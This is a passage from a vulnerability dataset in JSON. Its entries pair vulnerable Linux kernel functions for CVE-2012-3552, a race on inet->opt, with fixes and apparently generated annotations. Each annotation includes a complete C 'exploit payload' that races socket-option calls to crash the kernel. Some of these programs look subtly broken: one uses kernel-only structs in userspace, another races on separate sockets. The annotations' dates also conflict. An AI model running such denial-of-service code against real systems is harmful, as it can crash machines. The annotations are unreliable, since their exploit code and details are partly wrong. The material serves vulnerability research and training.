pointer dereference or concurrent struct corruption\n\nExploitability summary (1 sentence):\nThe exploit requires timing coordination between packet-send and socket-option-modify threads, but on multi-core systems the race is readily triggered through rapid concurrent operations.\n\nExploit script (summary, 3\u20136 bullets):\n- Create a raw socket and set initial IP options\n- Spawn thread 1 to continuously modify socket options via setsockopt(SO_IP_OPTIONS)\n- Spawn thread 2 to continuously send network packets (e.g., via raw send, ICMP echo, or TCP)\n- Race condition window exists between ip_options_echo() copying an outdated inet->opt and ip_append_data() using it\n- Slab corruption triggers kernel panic or DoS\n\nExploitation Example script payload code:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/ip.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nvoid *modify_opts(void *arg) {\n\tint sock = *(int *)arg;\n\tstruct ip_options opts;\n\twhile(1) {\n\t\tmemset(&opts, 0, sizeof opts);\n\t\tsetsockopt(sock, IPPROTO_IP, IP_OPTIONS, &opts, sizeof opts);\n\t\tusleep(1);\n\t}\n}\n\nvoid *trigger_reply(void *arg) {\n\tint sock = *(int *)arg;\n\twhile(1) {\n\t\tsendto(sock, \"x\", 1, 0, NULL, 0);\n\t\tusleep(1);\n\t}\n}\n\nint main() {\n\tint sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);\n\tpthread_t t1, t2;\n\tpthread_create(&t1, NULL, modify_opts, &sock);\n\tpthread_create(&t2, NULL, trigger_reply, &sock);\n\tsleep(30);\n\treturn 0;\n}\n\nFix\n\nFix code:\nstruct ip_options_data replyopts;\n\nif (ip_options_echo(&replyopts.opt.opt, skb))\n\treturn;\n\ndaddr = ipc.addr = rt->rt_src;\nipc.opt = NULL;\nipc.tx_flags = 0;\n\nif (replyopts.opt.opt.optlen) {\n\tipc.opt = &replyopts.opt;\n\t\n\tif (replyopts.opt.opt.srr)\n\t\tdaddr = replyopts.opt.opt.faddr;\n}\n\nFix summary:\nThe patch replaces the vulnerable inline struct definition with ip_options_data and introduces RCU (Read-Copy-Update) synchronization to protect inet->opt pointer access. This ensures that concurrent socket option modifications are safely serialized and stale pointers cannot be dereferenced.\n\nPatch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe patch wraps inet->opt in an RCU-protected ip_options_rcu structure to handle concurrent read/write synchronization. Readers now use rcu_dereference() to safely access the pointer, and writers use rcu_assign_pointer() to update it, with synchronize_rcu() ensuring safe memory reclamation. The fix maintains stack allocation but adds synchronization guarantees.\n\nPatchType: Synchronization addition via RCU protection\n\nVariant & Triage Guidance\n\nVariant analysis suggestions:\n- Review other socket option access paths (ip_make_skb, ip_setup_cork, ip_route_output_key) for similar unsynchronized access patterns\n- Audit all functions reading inet->opt without RCU protection or spinlock guards\n- Check IPv6 (inet6_opt) and other protocol families for analogous race conditions\n\nLikely variants/impact:\nSimilar race conditions may exist in IPv6 socket option handling and other protocol implementations that fail to synchronize concurrent option modifications.",
        "tests": "NA",
        "solutions": "void ip_send_reply(struct sock *sk, struct sk_buff *skb, struct ip_reply_arg *arg,\n \t\t   unsigned int len)\n {\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options_data replyopts;\n \tstruct ipcm_cookie ipc;\n \t__be32 daddr;\n \tstruct rtable *rt = skb_rtable(skb);\n \n\tif (ip_options_echo(&replyopts.opt.opt, skb))\n \t\treturn;\n \n \tdaddr = ipc.addr = rt->rt_src;\n \tipc.opt = NULL;\n \tipc.tx_flags = 0;\n \n\tif (replyopts.opt.opt.optlen) {\n \t\tipc.opt = &replyopts.opt;\n \n\t\tif (replyopts.opt.opt.srr)\n\t\t\tdaddr = replyopts.opt.opt.faddr;\n \t}\n \n \t{\n\t\tstruct flowi4 fl4;\n\n\t\tflowi4_init_output(&fl4, arg->bound_dev_if, 0,\n\t\t\t\t   RT_TOS(ip_hdr(skb)->tos),\n\t\t\t\t   RT_SCOPE_UNIVERSE, sk->sk_protocol,\n\t\t\t\t   ip_reply_arg_flowi_flags(arg),\n\t\t\t\t   daddr, rt->rt_spec_dst,\n\t\t\t\t   tcp_hdr(skb)->source, tcp_hdr(skb)->dest);\n\t\tsecurity_skb_classify_flow(skb, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_key(sock_net(sk), &fl4);\n\t\tif (IS_ERR(rt))\n\t\t\treturn;\n\t}\n\n\t/* And let IP do all the hard work.\n\n\t   This chunk is not reenterable, hence spinlock.\n\t   Note that it uses the fact, that this function is called\n\t   with locally disabled BH and that sk cannot be already spinlocked.\n\t */\n\tbh_lock_sock(sk);\n\tinet->tos = ip_hdr(skb)->tos;\n\tsk->sk_priority = skb->priority;\n\tsk->sk_protocol = ip_hdr(skb)->protocol;\n\tsk->sk_bound_dev_if = arg->bound_dev_if;\n\tip_append_data(sk, ip_reply_glue_bits, arg->iov->iov_base, len, 0,\n\t\t       &ipc, &rt, MSG_DONTWAIT);\n\tif ((skb = skb_peek(&sk->sk_write_queue)) != NULL) {\n\t\tif (arg->csumoffset >= 0)\n\t\t\t*((__sum16 *)skb_transport_header(skb) +\n\t\t\t  arg->csumoffset) = csum_fold(csum_add(skb->csum,\n\t\t\t\t\t\t\t\targ->csum));\n\t\tskb->ip_summed = CHECKSUM_NONE;\n\t\tip_push_pending_frames(sk);\n\t}\n\n\tbh_unlock_sock(sk);\n\n\tip_rt_put(rt);\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_output.c": "static int ip_setup_cork(struct sock *sk, struct inet_cork *cork,\n \t\t\t struct ipcm_cookie *ipc, struct rtable **rtp)\n {\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options *opt;\n \tstruct rtable *rt;\n \n \t/*\n\t * setup for corking.\n\t */\n\topt = ipc->opt;\n\tif (opt) {\n\t\tif (cork->opt == NULL) {\n\t\t\tcork->opt = kmalloc(sizeof(struct ip_options) + 40,\n\t\t\t\t\t    sk->sk_allocation);\n \t\t\tif (unlikely(cork->opt == NULL))\n \t\t\t\treturn -ENOBUFS;\n \t\t}\n\t\tmemcpy(cork->opt, opt, sizeof(struct ip_options) + opt->optlen);\n \t\tcork->flags |= IPCORK_OPT;\n \t\tcork->addr = ipc->addr;\n \t}\n\trt = *rtp;\n\tif (unlikely(!rt))\n\t\treturn -EFAULT;\n\t/*\n\t * We steal reference to this route, caller should not release it\n\t */\n\t*rtp = NULL;\n\tcork->fragsize = inet->pmtudisc == IP_PMTUDISC_PROBE ?\n\t\t\t rt->dst.dev->mtu : dst_mtu(rt->dst.path);\n\tcork->dst = &rt->dst;\n\tcork->length = 0;\n\tcork->tx_flags = ipc->tx_flags;\n\tcork->page = NULL;\n\tcork->off = 0;\n\n\treturn 0;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IP socket option handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2012-10-03\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource without Synchronization (\"Race Condition\")\n\n[Mandatory] Summary:\nThe ip_setup_cork() function in net/ipv4/ip_output.c copies the ipc->opt pointer (referring to inet->opt) without proper RCU synchronization. A concurrent thread can modify and free inet->opt while ip_setup_cork() is reading and copying it, resulting in a use-after-free condition. This race condition causes slab corruption and kernel crash when a remote attacker sends packets to an application that concurrently sets socket options (e.g., via setsockopt()).\n\n[Mandatory] Root cause:\nUnsynchronized access to inet->opt across multiple threads: one thread may free inet->opt while another (in ip_setup_cork) is reading and dereferencing it.\n\n[Mandatory] Attack Surface:\nIPv4 network stack, socket option handling within the kernel's IP output path\n\n[Mandatory] Impact Summary:\nDenial of service via slab corruption and system crash\n\n[Optional] Trigger / Attack vector:\nConcurrent network packet transmission combined with socket option modification (setsockopt)\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nopt = ipc->opt;\nif (opt) {\n    if (cork->opt == NULL) {\n        cork->opt = kmalloc(sizeof(struct ip_options) + 40,\n                            sk->sk_allocation);\n        if (unlikely(cork->opt == NULL))\n            return -ENOBUFS;\n    }\n    memcpy(cork->opt, opt, sizeof(struct ip_options) + opt->optlen);\n    cork->flags |= IPCORK_OPT;\n    cork->addr = ipc->addr;\n}\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nKernel socket option setter (setsockopt syscall) and network packet transmission (sendto/sendmsg syscall)\n\n[Mandatory] Exploit primitive(s) available:\nWrite-after-free / use-after-free of kernel memory; uncontrolled slab data corruption\n\n[Mandatory] Exploitability summary (1 sentence):\nThe race is probabilistic and requires precise timing between concurrent threads, but a sustained attack (repeatedly setting options while sending packets) can reliably trigger slab corruption and crash.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Thread 1: repeatedly calls setsockopt(IP_OPTIONS) to allocate and free inet->opt\n- Thread 2: repeatedly calls sendto/sendmsg to trigger ip_setup_cork() and hit the race window\n- Timing synchronization: use barriers and sleep patterns to increase collision probability\n- Trigger: once slab corruption is detected (kernel oops or system hang), DoS is confirmed\n- No user-space payload execution; kernel crash is the goal\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <pthread.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvolatile int stop_flag = 0;\n\nvoid* thread_tx(void* arg) {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    struct sockaddr_in addr = {.sin_family = AF_INET, .sin_port = htons(8888)};\n    char buf[256] = \"test\";\n    while (!stop_flag) {\n        sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));\n    }\n    close(sock);\n    return NULL;\n}\n\nvoid* thread_opt(void* arg) {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    unsigned char opts[40] = {0};\n    while (!stop_flag) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, NULL, 0);\n        usleep(1);\n    }\n    close(sock);\n    return NULL;\n}\n\nint main() {\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, thread_tx, NULL);\n    pthread_create(&t2, NULL, thread_opt, NULL);\n    sleep(30);\n    stop_flag = 1;\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nstatic int ip_setup_cork(struct sock *sk, struct inet_cork *cork,\n                        struct ipcm_cookie *ipc, struct rtable **rtp)\n{\n    struct inet_sock *inet = inet_sk(sk);\n    struct ip_options_rcu *opt;\n    struct rtable *rt;\n\n    /*\n     * setup for corking.\n     */\n    opt = ipc->opt;\n    if (opt) {\n        if (cork->opt == NULL) {\n            cork->opt = kmalloc(sizeof(struct ip_options) + 40,\n                                sk->sk_allocation);\n            if (unlikely(cork->opt == NULL))\n                return -ENOBUFS;\n        }\n        memcpy(cork->opt, &opt->opt, sizeof(struct ip_options) + opt->opt.optlen);\n        cork->flags |= IPCORK_OPT;\n        cork->addr = ipc->addr;\n    }\n    rt = *rtp;\n    if (unlikely(!rt))\n        return -EFAULT;\n    \n    *rtp = NULL;\n    cork->fragsize = inet->pmtudisc == IP_PMTUDISC_PROBE ?\n                     rt->dst.dev->mtu : dst_mtu(rt->dst.path);\n    cork->dst = &rt->dst;\n    cork->length = 0;\n    cork->tx_flags = ipc->tx_flags;\n    cork->page = NULL;\n    cork->off = 0;\n\n    return 0;\n}\n```\n\n[Mandatory] Fix summary:\nThe patch wraps struct ip_options in a new ip_options_rcu structure and adds RCU synchronization to inet->opt. Changes the memcpy to use &opt->opt and opt->opt.optlen (accessing the wrapped field safely). This ensures that inet->opt cannot be freed while ip_setup_cork() is reading it, eliminating the race condition.\n\n[Optional] Patch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259 (torvalds/linux); https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nPatchType: RCU synchronization added + data structure refactoring. The fix introduces RCU-protected access to inet->opt by wrapping the ip_options struct and using synchronize_rcu() or rcu_read_lock() barriers to prevent concurrent free and access.\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other sites where inet->opt is dereferenced without RCU (e.g., ip_route_output, TCP option handling) to identify similar races\n- Check if UDP, DCCP, or SCTP implement equivalent socket option copying; apply same RCU pattern if unprotected\n- Fuzz concurrent setsockopt and sendto calls on IPv4 sockets to detect residual synchronization gaps\n\n[Optional] Likely variants/impact (one line):\nSimilar use-after-free races in other socket option paths (TCP_OPTION, IPv6 IPV6_OPTS) may exist and should be reviewed and patched with RCU or mutual exclusion.",
        "tests": "NA",
        "solutions": "static int ip_setup_cork(struct sock *sk, struct inet_cork *cork,\n \t\t\t struct ipcm_cookie *ipc, struct rtable **rtp)\n {\n \tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ip_options_rcu *opt;\n \tstruct rtable *rt;\n \n \t/*\n\t * setup for corking.\n\t */\n\topt = ipc->opt;\n\tif (opt) {\n\t\tif (cork->opt == NULL) {\n\t\t\tcork->opt = kmalloc(sizeof(struct ip_options) + 40,\n\t\t\t\t\t    sk->sk_allocation);\n \t\t\tif (unlikely(cork->opt == NULL))\n \t\t\t\treturn -ENOBUFS;\n \t\t}\n\t\tmemcpy(cork->opt, &opt->opt, sizeof(struct ip_options) + opt->opt.optlen);\n \t\tcork->flags |= IPCORK_OPT;\n \t\tcork->addr = ipc->addr;\n \t}\n\trt = *rtp;\n\tif (unlikely(!rt))\n\t\treturn -EFAULT;\n\t/*\n\t * We steal reference to this route, caller should not release it\n\t */\n\t*rtp = NULL;\n\tcork->fragsize = inet->pmtudisc == IP_PMTUDISC_PROBE ?\n\t\t\t rt->dst.dev->mtu : dst_mtu(rt->dst.path);\n\tcork->dst = &rt->dst;\n\tcork->length = 0;\n\tcork->tx_flags = ipc->tx_flags;\n\tcork->page = NULL;\n\tcork->off = 0;\n\n\treturn 0;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_sockglue.c": "static int do_ip_getsockopt(struct sock *sk, int level, int optname,\n\t\t\t    char __user *optval, int __user *optlen)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tint val;\n\tint len;\n\n\tif (level != SOL_IP)\n\t\treturn -EOPNOTSUPP;\n\n\tif (ip_mroute_opt(optname))\n\t\treturn ip_mroute_getsockopt(sk, optname, optval, optlen);\n\n\tif (get_user(len, optlen))\n\t\treturn -EFAULT;\n\tif (len < 0)\n\t\treturn -EINVAL;\n\n\tlock_sock(sk);\n\n\tswitch (optname) {\n \tcase IP_OPTIONS:\n \t{\n \t\tunsigned char optbuf[sizeof(struct ip_options)+40];\n\t\tstruct ip_options * opt = (struct ip_options *)optbuf;\n \t\topt->optlen = 0;\n\t\tif (inet->opt)\n\t\t\tmemcpy(optbuf, inet->opt,\n\t\t\t       sizeof(struct ip_options)+\n\t\t\t       inet->opt->optlen);\n \t\trelease_sock(sk);\n \n \t\tif (opt->optlen == 0)\n\t\t\treturn put_user(0, optlen);\n\n\t\tip_options_undo(opt);\n\n\t\tlen = min_t(unsigned int, len, opt->optlen);\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, opt->__data, len))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\tcase IP_PKTINFO:\n\t\tval = (inet->cmsg_flags & IP_CMSG_PKTINFO) != 0;\n\t\tbreak;\n\tcase IP_RECVTTL:\n\t\tval = (inet->cmsg_flags & IP_CMSG_TTL) != 0;\n\t\tbreak;\n\tcase IP_RECVTOS:\n\t\tval = (inet->cmsg_flags & IP_CMSG_TOS) != 0;\n\t\tbreak;\n\tcase IP_RECVOPTS:\n\t\tval = (inet->cmsg_flags & IP_CMSG_RECVOPTS) != 0;\n\t\tbreak;\n\tcase IP_RETOPTS:\n\t\tval = (inet->cmsg_flags & IP_CMSG_RETOPTS) != 0;\n\t\tbreak;\n\tcase IP_PASSSEC:\n\t\tval = (inet->cmsg_flags & IP_CMSG_PASSSEC) != 0;\n\t\tbreak;\n\tcase IP_RECVORIGDSTADDR:\n\t\tval = (inet->cmsg_flags & IP_CMSG_ORIGDSTADDR) != 0;\n\t\tbreak;\n\tcase IP_TOS:\n\t\tval = inet->tos;\n\t\tbreak;\n\tcase IP_TTL:\n\t\tval = (inet->uc_ttl == -1 ?\n\t\t       sysctl_ip_default_ttl :\n\t\t       inet->uc_ttl);\n\t\tbreak;\n\tcase IP_HDRINCL:\n\t\tval = inet->hdrincl;\n\t\tbreak;\n\tcase IP_NODEFRAG:\n\t\tval = inet->nodefrag;\n\t\tbreak;\n\tcase IP_MTU_DISCOVER:\n\t\tval = inet->pmtudisc;\n\t\tbreak;\n\tcase IP_MTU:\n\t{\n\t\tstruct dst_entry *dst;\n\t\tval = 0;\n\t\tdst = sk_dst_get(sk);\n\t\tif (dst) {\n\t\t\tval = dst_mtu(dst);\n\t\t\tdst_release(dst);\n\t\t}\n\t\tif (!val) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -ENOTCONN;\n\t\t}\n\t\tbreak;\n\t}\n\tcase IP_RECVERR:\n\t\tval = inet->recverr;\n\t\tbreak;\n\tcase IP_MULTICAST_TTL:\n\t\tval = inet->mc_ttl;\n\t\tbreak;\n\tcase IP_MULTICAST_LOOP:\n\t\tval = inet->mc_loop;\n\t\tbreak;\n\tcase IP_MULTICAST_IF:\n\t{\n\t\tstruct in_addr addr;\n\t\tlen = min_t(unsigned int, len, sizeof(struct in_addr));\n\t\taddr.s_addr = inet->mc_addr;\n\t\trelease_sock(sk);\n\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, &addr, len))\n\t\t\treturn -EFAULT;\n\t\treturn 0;\n\t}\n\tcase IP_MSFILTER:\n\t{\n\t\tstruct ip_msfilter msf;\n\t\tint err;\n\n\t\tif (len < IP_MSFILTER_SIZE(0)) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tif (copy_from_user(&msf, optval, IP_MSFILTER_SIZE(0))) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EFAULT;\n\t\t}\n\t\terr = ip_mc_msfget(sk, &msf,\n\t\t\t\t   (struct ip_msfilter __user *)optval, optlen);\n\t\trelease_sock(sk);\n\t\treturn err;\n\t}\n\tcase MCAST_MSFILTER:\n\t{\n\t\tstruct group_filter gsf;\n\t\tint err;\n\n\t\tif (len < GROUP_FILTER_SIZE(0)) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tif (copy_from_user(&gsf, optval, GROUP_FILTER_SIZE(0))) {\n\t\t\trelease_sock(sk);\n\t\t\treturn -EFAULT;\n\t\t}\n\t\terr = ip_mc_gsfget(sk, &gsf,\n\t\t\t\t   (struct group_filter __user *)optval,\n\t\t\t\t   optlen);\n\t\trelease_sock(sk);\n\t\treturn err;\n\t}\n\tcase IP_MULTICAST_ALL:\n\t\tval = inet->mc_all;\n\t\tbreak;\n\tcase IP_PKTOPTIONS:\n\t{\n\t\tstruct msghdr msg;\n\n\t\trelease_sock(sk);\n\n\t\tif (sk->sk_type != SOCK_STREAM)\n\t\t\treturn -ENOPROTOOPT;\n\n\t\tmsg.msg_control = optval;\n\t\tmsg.msg_controllen = len;\n\t\tmsg.msg_flags = 0;\n\n\t\tif (inet->cmsg_flags & IP_CMSG_PKTINFO) {\n\t\t\tstruct in_pktinfo info;\n\n\t\t\tinfo.ipi_addr.s_addr = inet->inet_rcv_saddr;\n\t\t\tinfo.ipi_spec_dst.s_addr = inet->inet_rcv_saddr;\n\t\t\tinfo.ipi_ifindex = inet->mc_index;\n\t\t\tput_cmsg(&msg, SOL_IP, IP_PKTINFO, sizeof(info), &info);\n\t\t}\n\t\tif (inet->cmsg_flags & IP_CMSG_TTL) {\n\t\t\tint hlim = inet->mc_ttl;\n\t\t\tput_cmsg(&msg, SOL_IP, IP_TTL, sizeof(hlim), &hlim);\n\t\t}\n\t\tlen -= msg.msg_controllen;\n\t\treturn put_user(len, optlen);\n\t}\n\tcase IP_FREEBIND:\n\t\tval = inet->freebind;\n\t\tbreak;\n\tcase IP_TRANSPARENT:\n\t\tval = inet->transparent;\n\t\tbreak;\n\tcase IP_MINTTL:\n\t\tval = inet->min_ttl;\n\t\tbreak;\n\tdefault:\n\t\trelease_sock(sk);\n\t\treturn -ENOPROTOOPT;\n\t}\n\trelease_sock(sk);\n\n\tif (len < sizeof(int) && len > 0 && val >= 0 && val <= 255) {\n\t\tunsigned char ucval = (unsigned char)val;\n\t\tlen = 1;\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, &ucval, 1))\n\t\t\treturn -EFAULT;\n\t} else {\n\t\tlen = min_t(unsigned int, sizeof(int), len);\n\t\tif (put_user(len, optlen))\n\t\t\treturn -EFAULT;\n\t\tif (copy_to_user(optval, &val, len))\n\t\t\treturn -EFAULT;\n\t}\n\treturn 0;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IP socket options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification Without Proper Synchronization (Race Condition)\n\n[Mandatory] Summary:\nThe do_ip_getsockopt() function in net/ipv4/ip_sockglue.c directly accesses the inet->opt pointer to read IP socket options without proper RCU synchronization. A concurrent thread can deallocate or modify inet->opt while do_ip_getsockopt() is reading from it, leading to a use-after-free condition. This race condition causes slab corruption and a kernel crash when remote attackers send crafted network packets to an application that concurrently manipulates socket options.\n\n[Mandatory] Root cause:\nUnsynchronized concurrent access to inet->opt pointer: the function reads inet->opt without RCU protection, allowing another thread to free or reallocate it mid-operation.\n\n[Mandatory] Attack Surface:\nIP socket layer in kernel network stack; triggered by concurrent getsockopt() syscalls and network packet handling.\n\n[Mandatory] Impact Summary:\nDenial of service via kernel crash and slab corruption\n\n[Optional] Trigger / Attack vector:\nConcurrent UDP/TCP socket operations: getsockopt(IP_OPTIONS) race with setsockopt() or incoming network packets\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (inet->opt)\n\tmemcpy(optbuf, inet->opt,\n\t       sizeof(struct ip_options)+\n\t       inet->opt->optlen);\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nSocket layer syscall (getsockopt) races with network packet handling or concurrent setsockopt\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free read; slab corruption via concurrent access\n\n[Mandatory] Exploitability summary (1 sentence):\nExploitation is straightforward: spawn a thread continuously calling getsockopt(IP_OPTIONS) while another thread rapidly sends packets or modifies socket options on the same socket, with minimal requirements for triggering the race.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a UDP socket and set IP options via setsockopt(IP_OPTIONS)\n- Spawn thread 1 to repeatedly call getsockopt on the socket\n- Spawn thread 2 to repeatedly call setsockopt or send network traffic to trigger packet processing\n- The race between read (getsockopt) and modification/deallocation (packet handling or setsockopt) corrupts inet->opt\n- Kernel accesses freed or reallocated memory, causing oops/crash\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nint sock;\nvolatile int keep_running = 1;\n\nvoid* reader_thread(void* arg) {\n    unsigned char optbuf[256];\n    socklen_t optlen;\n    while (keep_running) {\n        optlen = sizeof(optbuf);\n        getsockopt(sock, IPPROTO_IP, IP_OPTIONS, optbuf, &optlen);\n    }\n    return NULL;\n}\n\nvoid* writer_thread(void* arg) {\n    unsigned char opts[256];\n    memset(opts, 0, sizeof(opts));\n    while (keep_running) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, sizeof(opts));\n        usleep(1);\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t t1, t2;\n    sock = socket(AF_INET, SOCK_DGRAM, 0);\n    pthread_create(&t1, NULL, reader_thread, NULL);\n    pthread_create(&t2, NULL, writer_thread, NULL);\n    sleep(5);\n    keep_running = 0;\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    close(sock);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\ncase IP_OPTIONS:\n{\n    unsigned char optbuf[sizeof(struct ip_options)+40];\n    struct ip_options *opt = (struct ip_options *)optbuf;\n    struct ip_options_rcu *inet_opt;\n\n    inet_opt = rcu_dereference_protected(inet->inet_opt,\n                                         sock_owned_by_user(sk));\n    opt->optlen = 0;\n    if (inet_opt)\n        memcpy(optbuf, &inet_opt->opt,\n               sizeof(struct ip_options) +\n               inet_opt->opt.optlen);\n    release_sock(sk);\n    ...\n}\n```\n\n[Mandatory] Fix summary:\nThe patch wraps inet->opt in a new ip_options_rcu structure and uses rcu_dereference_protected() to safely access it under the socket lock. This ensures that concurrent modifications are properly synchronized through RCU read-side critical sections and the socket ownership check.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nMessage: \"inet: add RCU protection to inet->opt\"\n\n[Optional] Patch Analysis:\nThe fix introduced RCU synchronization for the inet->opt pointer by creating an indirection layer (ip_options_rcu) and using rcu_dereference_protected() with sock_owned_by_user() check to safely read the option while the socket lock is held.\n\nPatchType: Synchronization fix; added RCU protection to prevent use-after-free in concurrent access\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Audit other socket option accessors (TCP, UDP) for similar unsynchronized pointer dereferences\n- Review all direct accesses to inet->opt in the kernelto ensure RCU or lock protection\n- Fuzz concurrent getsockopt/setsockopt patterns on various socket types and IP options\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions may exist in other socket implementations or network subsystems where option structures are accessed without proper locking or RCU protection.\n\nEND.",
        "tests": "NA",
